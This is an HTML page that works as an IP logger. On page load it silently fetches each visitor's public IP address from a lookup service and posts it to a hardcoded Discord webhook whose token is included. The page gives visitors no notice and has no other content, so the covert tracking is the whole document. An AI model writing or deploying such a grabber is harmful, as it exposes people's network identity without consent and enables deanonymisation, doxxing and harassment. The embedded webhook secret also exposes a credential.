<!DOCTYPE html>
<html>
<head>
  <title>Send IP to Discord Webhook</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
  <script>
    $(document).ready(function() {
      // Function to send the IP address to Discord webhook
      function sendIPToDiscord(ip) {
        // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
        var webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL';
        
        // Prepare the message payload
        var payload = {
          "content": "New visitor IP: " + ip
        };
        
        // Send a POST request to the webhook URL
        $.ajax({
          url: webhookUrl,
          type: 'POST',
          data: JSON.stringify(payload),
          contentType: 'application/json',
          success: function(response) {
            console.log('IP sent to Discord webhook successfully');
          },
          error: function(error) {
            console.log('Failed to send IP to Discord webhook:', error);
          }
        });
      }

      // Get the visitor's IP address using a public IP service
      $.getJSON('https://api.ipify.org?format=json', function(data) {
        var ip = data.ip;
        
        // Send the IP address to Discord webhook
        sendIPToDiscord(ip);
      });
    });
  </script>
</body>
</html>
